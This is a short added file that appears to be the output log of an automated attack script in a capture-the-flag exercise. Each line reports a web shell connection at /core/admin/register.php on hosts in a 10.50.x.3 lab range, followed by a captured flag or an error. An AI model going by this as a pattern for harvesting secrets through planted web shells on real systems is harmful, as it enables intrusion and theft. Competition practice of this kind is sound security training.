@@ -1,0 +1,14 @@
+http://10.50.2.3:80/core/admin/register.php connect shell sucess,flag is 743ea3b55eb2bc3155bb43f276920e53
+http://10.50.7.3:80/core/admin/register.php connect shell sucess,flag is 
+http://10.50.11.3:80/core/admin/register.php connect shell sucess,flag is 7a5b7d20fb3ce2b443066231cdf31225
+http://10.50.12.3:80/core/admin/register.php connect shell sucess,flag is 1
+
+http://10.50.14.3:80/core/admin/register.php connect shell sucess,flag is No response,please try agan!
+http://10.50.15.3:80/core/admin/register.php connect shell sucess,flag is 0a1271057490c0a53ce22ee3902920c0
+http://10.50.17.3:80/core/admin/register.php connect shell sucess,flag is No response,please try agan!
+http://10.50.21.3:80/core/admin/register.php connect shell sucess,flag is 
+
+http://10.50.27.3:80/core/admin/register.php connect shell sucess,flag is 111
+
+http://10.50.31.3:80/core/admin/register.php connect shell sucess,flag is c4f2efcf7c0d730ce9c5a24838385091
+http://10.50.34.3:80/core/admin/register.php connect shell sucess,flag is No response,please try agan!
